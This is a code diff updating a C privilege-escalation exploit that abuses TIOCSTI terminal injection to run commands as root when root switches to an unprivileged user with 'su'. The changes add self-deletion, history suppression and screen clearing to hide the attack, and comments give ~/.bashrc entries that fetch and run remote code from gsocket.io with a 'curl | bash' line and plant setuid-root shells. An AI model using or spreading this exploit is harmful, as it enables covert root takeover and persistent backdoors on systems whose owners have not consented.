@@ -1,5 +1,7 @@
-// Alice gets ROOT when ROOT uses 'su alice' to switch to Alice.
-// (This is the older trick in the book - TTY / TIOCSTI stuffing)
+// 2024 THC - https://www.thc.org
+//
+// Alice gets ROOT when ROOT uses 'su alice'.
+// (The oldest trick in the books - TTY / TIOCSTI stuffing)
 //
 // 'Alice' is a synonym for any unprivileged user. Useful when you have
 // shell access to 'apache', 'php', 'postgresql', or 'nobody' and need to
@@ -17,14 +19,24 @@
 //
 // For the elite only:
 // -------------------
-// It is possible to specify a different command via command line options.
-// Example of Alice's ~/.bashrc to start gs-netcat as ROOT (and report back to us):
-//    ~/.config/procps/ti 'GS_WEBHOOK_KEY=63a053ac-f921-419d-8cfe-ff703cacd39a bash -c "$(curl -fsSL https://gsocket.io/y)"'
+// ttyinject <command> <screen lines to clean>
+//
+// Example ~/.bashrc entries:
+//
+// 1. Install gs-netcat as ROOT (and report back to us):
+//    ~/.config/procps/reset 'GS_WEBHOOK_KEY=63a053ac-f921-419d-8cfe-ff703cacd39a bash -c "$(curl -fsSL https://gsocket.io/y)"' 2>/dev/null
+// 2. Clear the entire screen (rather then the last 4 lines):
+//    ~/.config/procps/reset "cp /bin/sh /tmp/.boom; chmod 4777 /bin/.boom" 0 2>/dev/null
+// 3. Clear 8 lines (rather then 4 lines):
+//    ~/.config/procps/reset "cp /bin/sh /tmp/.boom; chmod 4777 /bin/.boom" 8 2>/dev/null
+//
+// Will only execute ONCE (and delete itself) BUT you still need to cleanse ~/.bashrc
 
 #include <sys/ioctl.h>
 #include <sys/stat.h>
 #include <signal.h>
 #include <termios.h>
+#include <fcntl.h>
 #include <unistd.h>
 #include <stdlib.h>
 #include <stdio.h>
@@ -37,12 +49,13 @@
 // 4. Last re-open STDERR again and let 'su' come back to foreground..
 #define START "exec 2>&-\nset +o history\n({ "
 #define CMD "cp /bin/sh /var/tmp/.socket; chmod 4777 /var/tmp/.socket"
-#define END ";}>/dev/null 2>/dev/null &);exec 2>&0;fg\n"
+#define END ";}>/dev/null 2>/dev/null &);set -o history;exec 2>&0;fg\n"
 
 int
 main(int argc, char *argv[]) {
     pid_t ppid;
     char *ptr;
+    struct stat s;
 
     if ((getuid() == 0) || (!isatty(STDIN_FILENO)))
         exit(0);
@@ -50,13 +63,20 @@ main(int argc, char *argv[]) {
     if ((ppid = getppid()) <= 1)
         exit(0);
 
-    struct stat s;
     if ((ptr = ttyname(STDIN_FILENO)) == NULL)
         exit(0);
     if (stat(ptr, &s) != 0)
         exit(0);
     if (s.st_uid == getuid())
         exit(0); // TTY has same UID as us.
+
+    int clear = 4;
+    char buf[64];
+    if (argc >= 3)
+        clear = atoi(argv[2]);
+
+    // Only execute ONCE. Delete ourselves.
+    unlink(argv[0]);
 
     // suspend parent to background so that string goes into shell.
     if (kill(ppid, SIGSTOP) != 0)
@@ -78,7 +98,11 @@ main(int argc, char *argv[]) {
         ioctl(STDIN_FILENO, TIOCSTI, ptr);
 
     // Clear the messed up terminal.
-    printf("\033[4A\033[J");
+    if (clear > 0) {
+        snprintf(buf, sizeof buf, "\033[%dA\033[J", clear);
+        printf(buf);
+    } else
+        printf("\033[H\033[J");
     // Give 'fg' enough time to execute before taking back control.
     usleep(100 * 1000);
 
